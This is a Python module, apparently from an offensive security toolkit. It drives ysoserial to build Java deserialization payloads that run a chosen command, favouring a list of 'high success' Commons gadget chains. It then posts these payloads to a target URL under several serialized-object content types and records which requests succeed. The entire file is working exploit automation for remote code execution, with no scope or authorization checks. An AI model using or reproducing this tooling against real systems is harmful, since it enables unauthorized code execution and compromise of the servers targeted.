import subprocess
import os
import tempfile
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from core.logger import log


@dataclass
class YsoserialPayload:
    gadget: str
    command: str
    payload: bytes
    description: str


class YsoserialIntegration:
    def __init__(self, ysoserial_path: str = None):
        self.ysoserial_path = ysoserial_path or self._find_ysoserial()
        self.available_gadgets = []
        self._load_available_gadgets()

    def _find_ysoserial(self) -> Optional[str]:
        """Find ysoserial jar file"""
        possible_paths = [
            "tools/ysoserial.jar",
            "/usr/share/ysoserial/ysoserial.jar",
            "/opt/ysoserial/ysoserial.jar",
            "ysoserial.jar"
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        log.warning(
            "ysoserial.jar not found. Java deserialization payloads will not be available.")
        return None

    def _load_available_gadgets(self):
        """Load available ysoserial gadgets"""
        if not self.ysoserial_path:
            return

        try:
            result = subprocess.run(
                ["java", "-jar", self.ysoserial_path],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                # Parse available gadgets from help output
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Available gadget chains:' in line:
                        continue
                    if line.strip() and not line.startswith('Usage:'):
                        self.available_gadgets.append(line.strip())

            log.info(f"Loaded {len(self.available_gadgets)} ysoserial gadgets")

        except Exception as e:
            log.error(f"Failed to load ysoserial gadgets: {e}")

    def generate_payload(self, gadget: str, command: str) -> Optional[YsoserialPayload]:
        """Generate ysoserial payload"""
        if not self.ysoserial_path:
            log.error("ysoserial.jar not available")
            return None

        if gadget not in self.available_gadgets:
            log.error(f"Gadget {gadget} not available")
            return None

        try:
            result = subprocess.run(
                ["java", "-jar", self.ysoserial_path, gadget, command],
                capture_output=True,
                timeout=30
            )

            if result.returncode == 0:
                return YsoserialPayload(
                    gadget=gadget,
                    command=command,
                    payload=result.stdout,
                    description=f"ysoserial {gadget} payload for command: {command}"
                )
            else:
                log.error(f"Failed to generate payload: {result.stderr}")
                return None

        except Exception as e:
            log.error(f"Exception generating ysoserial payload: {e}")
            return None

    def generate_all_payloads(self, command: str) -> List[YsoserialPayload]:
        """Generate payloads for all available gadgets"""
        payloads = []

        for gadget in self.available_gadgets:
            payload = self.generate_payload(gadget, command)
            if payload:
                payloads.append(payload)

        return payloads

    def get_high_success_gadgets(self) -> List[str]:
        """Get gadgets with high success rates"""
        high_success = [
            "CommonsCollections1",
            "CommonsCollections2",
            "CommonsCollections3",
            "CommonsCollections4",
            "CommonsCollections5",
            "CommonsCollections6",
            "CommonsBeanutils1",
            "CommonsBeanutils2",
            "CommonsCollectionsK1",
            "CommonsCollectionsK2",
            "CommonsCollectionsK3",
            "CommonsCollectionsK4"
        ]

        return [g for g in high_success if g in self.available_gadgets]

    def test_payload(self, payload: YsoserialPayload, target_url: str) -> Dict[str, Any]:
        """Test ysoserial payload against target"""
        import requests
        import base64

        try:
            # Encode payload
            encoded_payload = base64.b64encode(payload.payload).decode()

            # Test different content types
            content_types = [
                "application/java-serialized-object",
                "application/octet-stream",
                "application/x-java-serialized-object"
            ]

            results = {}

            for content_type in content_types:
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "dLNkdLNk-Deserialization/1.0"
                }

                try:
                    response = requests.post(
                        target_url,
                        data=payload.payload,
                        headers=headers,
                        timeout=30
                    )

                    results[content_type] = {
                        "status_code": response.status_code,
                        "response_time": response.elapsed.total_seconds(),
                        "response_size": len(response.content),
                        "success": response.status_code == 200
                    }

                except Exception as e:
                    results[content_type] = {
                        "error": str(e),
                        "success": False
                    }

            return results

        except Exception as e:
            log.error(f"Failed to test payload: {e}")
            return {"error": str(e), "success": False}
